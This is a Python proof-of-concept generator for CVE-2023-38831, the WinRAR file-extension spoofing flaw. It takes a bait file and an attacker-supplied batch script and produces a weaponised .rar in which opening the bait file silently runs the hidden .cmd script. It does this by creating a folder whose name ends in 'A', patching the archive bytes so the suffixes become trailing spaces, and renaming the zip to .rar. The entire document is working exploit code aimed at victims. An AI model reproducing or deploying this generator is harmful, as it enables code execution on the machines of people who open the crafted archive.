import shutil
import os, sys
from os.path import join
TEMPLATE_NAME = "OUTPUT"
OUTPUT_NAME = "CVE-2023-38831-poc.rar"

# Just arguments for file inputs to the script
if len(sys.argv) > 3:
    BAIT_NAME = os.path.basename(sys.argv[1])
    SCRIPT_NAME = os.path.basename(sys.argv[2])
    OUTPUT_NAME = os.path.basename(sys.argv[3])

    # Extra files that are going to be in the same directory as the script file
    PADDING_FILES_DIR = os.path.basename(sys.argv[4])

    # Files that are going to be in the same directory as the bait file
    EXTRA_FILES_DIR = os.path.basename(sys.argv[5])
else:
    print("""Usage:
          python .\cve-2023-38831-exp-gen.py <BAIT_NAME> <SCRIPT_NAME> <OUTPUT_NAME> <PADDING_FILES_DIR> <EXTRA_FILES_DIR>""")
    sys.exit()

# Gets the extension of the file that the victim is going to click on
BAIT_EXT = b"." + bytes(BAIT_NAME.split(".")[-1], "utf-8")


# Prints out the input files
print("BAIT_NAME:", BAIT_NAME)
print("SCRIPT_NAME:", SCRIPT_NAME)
print("OUTPUT_NAME:", OUTPUT_NAME)
print("PADDING_FILES_DIR:", PADDING_FILES_DIR)

# If the directory exists remove it
if os.path.exists(TEMPLATE_NAME):
    shutil.rmtree(TEMPLATE_NAME)

# Creates a directory with the TEMPLATE_NAME
os.mkdir(TEMPLATE_NAME)

# Joins the root folder with the bait name with an "A"
d = join(TEMPLATE_NAME, BAIT_NAME + "A")

# If it does not exists make it
if not os.path.exists(d):
    os.mkdir(d)

# Uses the library to copy the batch script to a folder
shutil.copyfile(join(SCRIPT_NAME), join(d, BAIT_NAME+"A.cmd"))

for filename in os.listdir("ico"):
    source_file_path = os.path.join(PADDING_FILES_DIR, filename)
    
    shutil.copyfile(source_file_path, join(d, filename))

print("Files copied successfully!")

# Uses the library to copy bait file into the TEMPLATE folder
shutil.copyfile(join(BAIT_NAME), join(TEMPLATE_NAME, BAIT_NAME+"B"))

for filename in os.listdir("files"):
    source_file_path = os.path.join(EXTRA_FILES_DIR, filename)
    
    shutil.copyfile(source_file_path, join(TEMPLATE_NAME, filename))

# Uses the library to archive the file
shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)


# Replaces the extensions within the archive
with open(TEMPLATE_NAME + ".zip", "rb") as f:
    content = f.read()
    content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")
    content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")

# Removes the original zip file
# os.remove(TEMPLATE_NAME + ".zip")

# The content variable has the data in bytes
# So it just writes it into the OUTPUT_NAME (rar file)
with open(OUTPUT_NAME, "wb")  as f:
    f.write(content)

# When it's done (duhhh)
print("ok..")
